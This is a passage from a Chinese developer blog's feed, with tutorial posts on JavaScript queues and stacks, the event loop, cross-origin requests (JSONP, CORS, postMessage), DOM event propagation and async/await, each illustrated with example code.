队头</span></div><div class="line">    <span class="keyword">this</span>.first = <span class="number">0</span></div><div class="line">    <span class="comment">// 队尾</span></div><div class="line">    <span class="keyword">this</span>.last = <span class="number">0</span></div><div class="line">    <span class="comment">// 当前队列大小</span></div><div class="line">    <span class="keyword">this</span>.size = <span class="number">0</span></div><div class="line">  &#125;</div><div class="line">  enQueue(item) &#123;</div><div class="line">    <span class="comment">// 判断队尾 + 1 是否为队头</span></div><div class="line">    <span class="comment">// 如果是就代表需要扩容数组</span></div><div class="line">    <span class="comment">// % this.queue.length 是为了防止数组越界</span></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.first === (<span class="keyword">this</span>.last + <span class="number">1</span>) % <span class="keyword">this</span>.queue.length) &#123;</div><div class="line">      <span class="keyword">this</span>.resize(<span class="keyword">this</span>.getLength() * <span class="number">2</span> + <span class="number">1</span>)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">this</span>.queue[<span class="keyword">this</span>.last] = item</div><div class="line">    <span class="keyword">this</span>.size++</div><div class="line">    <span class="keyword">this</span>.last = (<span class="keyword">this</span>.last + <span class="number">1</span>) % <span class="keyword">this</span>.queue.length</div><div class="line">  &#125;</div><div class="line">  deQueue() &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isEmpty()) &#123;</div><div class="line">      <span class="keyword">throw</span> Error(<span class="string">'Queue is empty'</span>)</div><div class="line">    &#125;</div><div class="line">    let r = <span class="keyword">this</span>.queue[<span class="keyword">this</span>.first]</div><div class="line">    <span class="keyword">this</span>.queue[<span class="keyword">this</span>.first] = <span class="literal">null</span></div><div class="line">    <span class="keyword">this</span>.first = (<span class="keyword">this</span>.first + <span class="number">1</span>) % <span class="keyword">this</span>.queue.length</div><div class="line">    <span class="keyword">this</span>.size--</div><div class="line">    <span class="comment">// 判断当前队列大小是否过小</span></div><div class="line">    <span class="comment">// 为了保证不浪费空间，在队列空间等于总长度四分之一时</span></div><div class="line">    <span class="comment">// 且不为 2 时缩小总长度为当前的一半</span></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.size === <span class="keyword">this</span>.getLength() / <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.getLength() / <span class="number">2</span> !== <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">this</span>.resize(<span class="keyword">this</span>.getLength() / <span class="number">2</span>)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> r</div><div class="line">  &#125;</div><div class="line">  getHeader() &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isEmpty()) &#123;</div><div class="line">      <span class="keyword">throw</span> Error(<span class="string">'Queue is empty'</span>)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.queue[<span class="keyword">this</span>.first]</div><div class="line">  &#125;</div><div class="line">  getLength() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.queue.length - <span class="number">1</span></div><div class="line">  &#125;</div><div class="line">  isEmpty() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.first === <span class="keyword">this</span>.last</div><div class="line">  &#125;</div><div class="line">  resize(length) &#123;</div><div class="line">    let q = new Array(length)</div><div class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; length; i++) &#123;</div><div class="line">      q[i] = <span class="keyword">this</span>.queue[(i + <span class="keyword">this</span>.first) % <span class="keyword">this</span>.queue.length]</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">this</span>.queue = q</div><div class="line">    <span class="keyword">this</span>.first = <span class="number">0</span></div><div class="line">    <span class="keyword">this</span>.last = <span class="keyword">this</span>.size</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="★30s总结"><a href="#★30s总结" class="headerlink" title="★30s总结"></a>★30s总结</h2><ul><li>记住图，先进先出</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;队列一个线性结构，特点是在某一端添加数据，在另一端删除数据，遵循&lt;strong&gt;先进先出&lt;/strong&gt;的原则。&lt;br&gt;
    
    </summary>
    
    
      <category term="数据结构" scheme="wangsiyuan233.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>数据结构(2) -- 栈</title>
    <link href="wangsiyuan233.github.io/2018/09/18/75%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-2/"/>
    <id>wangsiyuan233.github.io/2018/09/18/75数据结构-2/</id>
    <published>2018-09-18T02:18:13.000Z</published>
    <updated>2018-09-18T09:35:07.155Z</updated>
    
    <content type="html"><![CDATA[<p>栈是一个线性结构</p><p>栈的特点是只能在<strong>某一端</strong>添加或删除数据，遵循<strong>先进后出</strong>的原则<br><a id="more"></a><br><img src="https://i.imgur.com/UcwdXxz.png" alt=""><br>把栈看成是数组的一个子集:<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stack</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>() &#123;</div><div class="line">    <span class="keyword">this</span>.stack = []</div><div class="line">  &#125;</div><div class="line">  push(item) &#123;</div><div class="line">    <span class="keyword">this</span>.stack.push(item)</div><div class="line">  &#125;</div><div class="line">  pop() &#123;</div><div class="line">    <span class="keyword">this</span>.stack.pop()</div><div class="line">  &#125;</div><div class="line">  peek() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.stack[<span class="keyword">this</span>.getCount() - <span class="number">1</span>]</div><div class="line">  &#125;</div><div class="line">  getCount() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.stack.length</div><div class="line">  &#125;</div><div class="line">  isEmpty() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getCount() === <span class="number">0</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>应用题<br>题目：<a href="https://leetcode.com/problems/valid-parentheses/description/" target="_blank" rel="external">Valid Parentheses</a><br>匹配括号，可以用栈来做<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">var</span> isValid = function (s) &#123;</div><div class="line">  <span class="built_in">let</span> <span class="built_in">map</span> = &#123;</div><div class="line">    '(': -<span class="number">1</span>,</div><div class="line">    ')': <span class="number">1</span>,</div><div class="line">    '[': -<span class="number">2</span>,</div><div class="line">    ']': <span class="number">2</span>,</div><div class="line">    '&#123;': -<span class="number">3</span>,</div><div class="line">    '&#125;': <span class="number">3</span></div><div class="line">  &#125;</div><div class="line">  <span class="built_in">let</span> stack = []</div><div class="line">  <span class="keyword">for</span> (<span class="built_in">let</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>; i++) &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="built_in">map</span>[s[i]] &lt; <span class="number">0</span>) &#123;</div><div class="line">      stack.<span class="built_in">push</span>(s[i])</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      <span class="built_in">let</span> <span class="built_in">last</span> = stack.<span class="built_in">pop</span>()</div><div class="line">      <span class="keyword">if</span> (<span class="built_in">map</span>[<span class="built_in">last</span>] + <span class="built_in">map</span>[s[i]] != <span class="number">0</span>) <span class="built_in">return</span> <span class="literal">false</span></div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> (stack.<span class="built_in">length</span> &gt; <span class="number">0</span>) <span class="built_in">return</span> <span class="literal">false</span></div><div class="line">  <span class="built_in">return</span> <span class="literal">true</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><h2 id="★30s总结"><a href="#★30s总结" class="headerlink" title="★30s总结"></a>★30s总结</h2><ul><li>记住图，先进后出</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;栈是一个线性结构&lt;/p&gt;
&lt;p&gt;栈的特点是只能在&lt;strong&gt;某一端&lt;/strong&gt;添加或删除数据，遵循&lt;strong&gt;先进后出&lt;/strong&gt;的原则&lt;br&gt;
    
    </summary>
    
    
      <category term="数据结构" scheme="wangsiyuan233.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>Event Loop</title>
    <link href="wangsiyuan233.github.io/2018/09/15/73Event-Loop/"/>
    <id>wangsiyuan233.github.io/2018/09/15/73Event-Loop/</id>
    <published>2018-09-15T10:56:59.000Z</published>
    <updated>2018-09-15T12:13:40.324Z</updated>
    
    <content type="html"><![CDATA[<p>JS 是单线程语言</p><p>JS 在执行的过程中会产生执行环境，这些执行环境会被顺序的加入到执行栈中。如果遇到异步的代码，会被挂起并加入到 Task（有多种 task） 队列中。一旦执行栈为空，Event Loop 就会从 Task 队列中拿出需要执行的代码并放入执行栈中执行，所以本质上来说 <strong>JS 中的异步还是同步行为</strong>。<br><a id="more"></a><br>不同的任务源会被分配到不同的 Task 队列中，任务源可以分为 微任务（microtask） 和 宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">console</span>.log(<span class="string">'script start'</span>);</div><div class="line"></div><div class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'setTimeout'</span>);</div><div class="line">&#125;, <span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'Promise'</span>)</div><div class="line">    resolve()</div><div class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'promise1'</span>);</div><div class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'promise2'</span>);</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(<span class="string">'script end'</span>);</div><div class="line"><span class="comment">// script start =&gt; Promise =&gt; script end =&gt; promise1 =&gt; promise2 =&gt; setTimeout</span></div></pre></td></tr></table></figure></p><p>以上代码虽然 <code>setTimeout</code> 写在 <code>Promise</code> 之前，但是因为 <code>Promise</code> 属于微任务而 <code>setTimeout</code> 属于宏任务，所以会有以上的打印。</p><p>微任务包括 <code>process.nextTick</code> ，<code>promise</code> ，<code>Object.observe</code> ，<code>MutationObserver</code></p><p>宏任务包括 <code>script</code> ， <code>setTimeout</code> ，<code>setInterval</code> ，<code>setImmediate</code> ，<code>I/O</code> ，<code>UI rendering</code></p><p>很多人有个误区，认为微任务快于宏任务，其实是错误的。因为宏任务中包括了 <code>script</code> ，<strong>浏览器会先执行一个宏任务，接下来有异步代码的话就先执行微任务。</strong></p><p>所以正确的一次 Event loop 顺序是这样的：</p><ul><li>执行同步代码，这属于宏任务</li><li>执行栈为空，查询是否有微任务需要执行</li><li>执行所有微任务</li><li>必要的话渲染 UI</li><li>然后开始下一轮 Event loop，执行宏任务中的异步代码<br>通过上述的 Event loop 顺序可知，如果宏任务中的异步代码有大量的计算并且需要操作 DOM 的话，为了更快的 界面响应，我们可以把操作 DOM 放入微任务中。</li></ul><hr><p><a href="https://github.com/InterviewMap/CS-Interview-Knowledge-Map/blob/master/Browser/browser-ch.md#node-%E4%B8%AD%E7%9A%84-event-loop" target="_blank" rel="external">Node 中的 Event loop</a></p><p>学完 node 之后补充</p><h2 id="★30s总结"><a href="#★30s总结" class="headerlink" title="★30s总结"></a>★30s总结</h2><ul><li>任务分为 微观任务 和 宏观任务</li><li>先宏观的同步代码</li><li>发现有微观！</li><li>做微观吧（<code>promise</code> ）</li><li>继续宏观的异步代码</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;JS 是单线程语言&lt;/p&gt;
&lt;p&gt;JS 在执行的过程中会产生执行环境，这些执行环境会被顺序的加入到执行栈中。如果遇到异步的代码，会被挂起并加入到 Task（有多种 task） 队列中。一旦执行栈为空，Event Loop 就会从 Task 队列中拿出需要执行的代码并放入执行栈中执行，所以本质上来说 &lt;strong&gt;JS 中的异步还是同步行为&lt;/strong&gt;。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>跨域</title>
    <link href="wangsiyuan233.github.io/2018/09/13/72%E8%B7%A8%E5%9F%9F/"/>
    <id>wangsiyuan233.github.io/2018/09/13/72跨域/</id>
    <published>2018-09-13T01:36:18.000Z</published>
    <updated>2018-09-15T10:57:34.577Z</updated>
    
    <content type="html"><![CDATA[<p>浏览器出于安全的考虑，采用的是同源策略。</p><p>协议、域名和端口号三者统一，就是同域，只要有其中一个不一样，就是跨域，这时Ajax就会请求失败。</p><p>下面有三种方法可以解决跨域的问题<br><a id="more"></a></p><blockquote><p>一、JSONP</p></blockquote><p><code>JSONP</code> 的原理非常简单：</p><p>利用 <code>&lt;script&gt;</code> 标签没有跨域限制的漏洞，通过 <code>&lt;script&gt;</code> 标签指向一个需要访问的地址并提供一个回调函数来接收数据。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://domain/api?param1=a&amp;param2=b&amp;callback=jsonp"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jsonp</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(data)</div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p><p><code>JSONP</code>的兼容性很好，但只限于 <strong>GET</strong> 请求</p><p>在开发中可能会遇到多个 <code>JSONP</code> 请求的回调函数名是相同的，这时候就需要自己封装一个 <code>JSONP</code>，以下是简单实现：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">function <span class="keyword">jsonp(url, </span><span class="keyword">jsonpCallback, </span>success) &#123;</div><div class="line">  let <span class="keyword">script </span>= document.createElement(<span class="string">"script"</span>)<span class="comment">;</span></div><div class="line">  <span class="keyword">script.src </span>= url<span class="comment">;</span></div><div class="line">  <span class="keyword">script.async </span>= true<span class="comment">;</span></div><div class="line">  <span class="keyword">script.type </span>= <span class="string">"text/javascript"</span><span class="comment">;</span></div><div class="line">  window[<span class="keyword">jsonpCallback] </span>= function(data) &#123;</div><div class="line">    success &amp;&amp; success(data)<span class="comment">;</span></div><div class="line">  &#125;<span class="comment">;</span></div><div class="line">  document.<span class="keyword">body.appendChild(script);</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">jsonp(</span></div><div class="line">  <span class="string">"http://xxx"</span>,</div><div class="line">  <span class="string">"callback"</span>,</div><div class="line">  function(value) &#123;</div><div class="line">    console.log(value)<span class="comment">;</span></div><div class="line">  &#125;</div><div class="line">)<span class="comment">;</span></div></pre></td></tr></table></figure></p><blockquote><p>二、CORS</p></blockquote><p><code>CORS</code> 需要<strong>浏览器</strong>和<strong>后端</strong>同时支持。</p><p>服务端设置 <code>Access-Control-Allow-Origin</code> 就可以开启 CORS。 该属性表示哪些域名可以访问资源，如果设置通配符则表示所有网站都可以访问资源。</p><p>实现 <code>CORS</code> 通信的关键是后端。只要后端实现了 <code>CORS</code>，就实现了跨域。</p><blockquote><p>三、document.domain</p></blockquote><p>该方式只能用于二级域名相同的情况下，比如 <code>a.test.com</code> 和 <code>b.test.com</code> 适用于该方式。</p><p>只需要给页面添加 <code>document.domain = &#39;test.com&#39;</code> 表示二级域名都相同就可以实现跨域。</p><blockquote><p>四、postMessage</p></blockquote><p>这种方式通常用于获取嵌入页面中的第三方页面数据。一个页面发送消息，另一个页面判断来源并接收消息<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 发送消息端</span></div><div class="line"><span class="built_in">window</span>.parent.postMessage(<span class="string">'message'</span>, <span class="string">'http://test.com'</span>);</div><div class="line"><span class="comment">// 接收消息端</span></div><div class="line"><span class="keyword">var</span> mc = <span class="keyword">new</span> MessageChannel();</div><div class="line">mc.addEventListener(<span class="string">'message'</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</div><div class="line">    <span class="keyword">var</span> origin = event.origin || event.originalEvent.origin; </div><div class="line">    <span class="keyword">if</span> (origin === <span class="string">'http://test.com'</span>) &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'验证通过'</span>)</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p><h2 id="★30s总结"><a href="#★30s总结" class="headerlink" title="★30s总结"></a>★30s总结</h2><ul><li><code>JSONP</code> : 利用 <code>&lt;script&gt;</code> 标签的漏洞来跨域；</li><li><code>CORS</code>：服务端和后端，后端是关键</li><li><code>document.domian</code> ： 二级域名相同</li><li><code>postMessage</code> ： 一个页面发送，另一个页面接收并验证</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;浏览器出于安全的考虑，采用的是同源策略。&lt;/p&gt;
&lt;p&gt;协议、域名和端口号三者统一，就是同域，只要有其中一个不一样，就是跨域，这时Ajax就会请求失败。&lt;/p&gt;
&lt;p&gt;下面有三种方法可以解决跨域的问题&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>事件机制</title>
    <link href="wangsiyuan233.github.io/2018/09/11/71%E4%BA%8B%E4%BB%B6%E6%9C%BA%E5%88%B6/"/>
    <id>wangsiyuan233.github.io/2018/09/11/71事件机制/</id>
    <published>2018-09-11T14:48:17.000Z</published>
    <updated>2018-09-12T02:17:18.125Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一、事件触发</p></blockquote><ol><li><code>window</code> 到 触发处 的途中，碰到了 捕获 就会触发</li><li>到了 触发处，肯定也会激活啊</li><li>从 触发处 往 <code>window</code> 传播，碰到了 冒泡 就会触发</li></ol><a id="more"></a><p>一般情况下都是按照上面三个步骤发展，如果一个事件同时有 冒泡和捕获，那就按照发生的顺序来<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">node.addEventListener(<span class="string">'click'</span>,<span class="function"><span class="params">(event)</span> =&gt;</span>&#123;</div><div class="line"><span class="built_in">console</span>.log(<span class="string">'冒泡'</span>)</div><div class="line">&#125;,<span class="literal">false</span>);</div><div class="line">node.addEventListener(<span class="string">'click'</span>,<span class="function"><span class="params">(event)</span> =&gt;</span>&#123;</div><div class="line"><span class="built_in">console</span>.log(<span class="string">'捕获 '</span>)</div><div class="line">&#125;,<span class="literal">true</span>)</div><div class="line"></div><div class="line"><span class="regexp">//</span> 冒泡 捕获</div></pre></td></tr></table></figure></p><blockquote><p>二、注册事件</p></blockquote><p>我们用 addEventListener 注册事件，这个函数的第三个参数可以是 布尔值useCapture，也可以是对象</p><ul><li>参数为 布尔值useCapture 时，默认的是 false，即 冒泡事件。</li><li>参数为对象时，省略。</li></ul><p>我们希望事件到了触发处就停止了，这时可以使用 stopPropagation 来阻止进一步传播：</p><ul><li><code>stopPropagation</code> 不仅可以阻止冒泡，也可以阻止捕获</li><li><code>stopImmediatePropagation</code> 更强，在上面基础上，还可以阻止除了当前事件的其他事件注册<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">node.addEventListener(<span class="string">'click'</span>,<span class="function"><span class="params">(event)</span> =&gt;</span>&#123;</div><div class="line">event.stopImmediatePropagation()</div><div class="line"><span class="built_in">console</span>.log(<span class="string">'冒泡'</span>)</div><div class="line">&#125;,<span class="literal">false</span>);</div><div class="line"><span class="regexp">//</span> 点击 node 只会执行上面的函数，该函数不会执行</div><div class="line">node.addEventListener(<span class="string">'click'</span>,<span class="function"><span class="params">(event)</span> =&gt;</span> &#123;</div><div class="line"><span class="built_in">console</span>.log(<span class="string">'捕获 '</span>)</div><div class="line">&#125;,<span class="literal">true</span>)</div></pre></td></tr></table></figure></li></ul><blockquote><p>三、事件代理</p></blockquote><p>如果一个节点中的子节点是动态生成的，那么子节点需要注册事件的话应该注册在父节点上。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"ul"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>5<span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="keyword">let</span> ul = <span class="built_in">document</span>.querySelector(<span class="string">'#ul'</span>)</div><div class="line">ul.addEventListener(<span class="string">'click'</span>, (event) =&gt; &#123;</div><div class="line"><span class="built_in">console</span>.log(event.target);</div><div class="line">&#125;)</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p><p>事件代理的优点：</p><ul><li>节省内存</li><li>不需要给子节点注销事件</li></ul><h2 id="30s总结"><a href="#30s总结" class="headerlink" title="30s总结"></a>30s总结</h2><ul><li>事件机制 <code>addEventListener</code> 分三步走: 捕获、触发和冒泡</li><li><code>stopPropagation</code> 和 <code>stopImmediatePropagation</code> 都可以阻止触发</li><li>动态的子节点，需要去父节点上触发</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;一、事件触发&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;window&lt;/code&gt; 到 触发处 的途中，碰到了 捕获 就会触发&lt;/li&gt;
&lt;li&gt;到了 触发处，肯定也会激活啊&lt;/li&gt;
&lt;li&gt;从 触发处 往 &lt;code&gt;window&lt;/code&gt; 传播，碰到了 冒泡 就会触发&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>深入理解JavaScript--异步系列(4)</title>
    <link href="wangsiyuan233.github.io/2018/08/23/70%E5%BC%82%E6%AD%A5%E7%B3%BB%E5%88%97-4/"/>
    <id>wangsiyuan233.github.io/2018/08/23/70异步系列-4/</id>
    <published>2018-08-23T11:41:21.000Z</published>
    <updated>2018-09-13T12:18:12.940Z</updated>
    
    <content type="html"><![CDATA[<h2 id="async-和-await"><a href="#async-和-await" class="headerlink" title="async 和 await"></a>async 和 await</h2><p>async 和 await<br>1、一个函数如果加上 <code>async</code> ，那么该函数就会返回一个 <code>Promise</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="string">"1"</span>;</div><div class="line">&#125;</div><div class="line"><span class="built_in">console</span>.log(test()); <span class="comment">// -&gt; Promise &#123;&lt;resolved&gt;: "1"&#125;</span></div></pre></td></tr></table></figure></p><p>可以把 <code>async</code> 看成将函数返回值使用 <code>Promise.resolve()</code> 包裹了下<br><a id="more"></a><br>2、<code>await</code> 只能在 <code>async</code> 函数中使用<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</div><div class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</div><div class="line">      <span class="built_in">console</span>.log(<span class="string">'finish'</span>)</div><div class="line">      resolve(<span class="string">"sleep"</span>);</div><div class="line">    &#125;, <span class="number">2000</span>);</div><div class="line">  &#125;);</div><div class="line">&#125;</div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">let</span> value = <span class="keyword">await</span> sleep();</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">"object"</span>);</div><div class="line">&#125;</div><div class="line">test()</div></pre></td></tr></table></figure></p><p>上面代码会先打印 <code>finish</code> 然后再打印 <code>object</code> 。因为 <code>await</code> 会等待 <code>sleep</code> 函数 <code>resolve</code> ，<strong>所以即使后面是同步代码，也不会先去执行同步代码再来执行异步代码。</strong></p><p><code>async</code> 和 <code>await</code> 相比直接使用 <code>Promise</code> 来说，优势在于处理 <code>then</code> 的调用链，能够更清晰准确的写出代码。缺点在于滥用 <code>await</code> 可能会导致性能问题，因为 <code>await</code> 会阻塞代码，也许之后的异步代码并不依赖于前者，但仍然需要等待前者完成，导致代码失去了并发性。</p><p>下面来看一个使用 <code>await</code> 的代码:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">var</span> <span class="selector-tag">a</span> = <span class="number">0</span></div><div class="line"><span class="selector-tag">var</span> <span class="selector-tag">b</span> = async () =&gt; &#123;</div><div class="line">  <span class="selector-tag">a</span> = <span class="selector-tag">a</span> + await <span class="number">10</span></div><div class="line">  console.log(<span class="string">'2'</span>, a) <span class="comment">// -&gt; '2' 10</span></div><div class="line">  <span class="selector-tag">a</span> = (await <span class="number">10</span>) + <span class="selector-tag">a</span></div><div class="line">  console.log(<span class="string">'3'</span>, a) <span class="comment">// -&gt; '3' 20</span></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="title">b</span><span class="params">()</span></span></div><div class="line">a++</div><div class="line">console.log(<span class="string">'1'</span>, a) <span class="comment">// -&gt; '1' 1</span></div></pre></td></tr></table></figure></p><p>对于以上代码你可能会有疑惑，这里说明下原理</p><ul><li>首先函数 b 先执行，在执行到 <code>await 10</code> 之前变量 <code>a</code> 还是 0，因为在 <code>await</code> 内部实现了 <code>generators</code> ，<code>generators</code> 会保留堆栈中东西，所以这时候 <code>a = 0</code> 被保存了下来</li><li>因为 <code>await</code> 是异步操作，所以会先执行 <code>console.log(&#39;1&#39;, 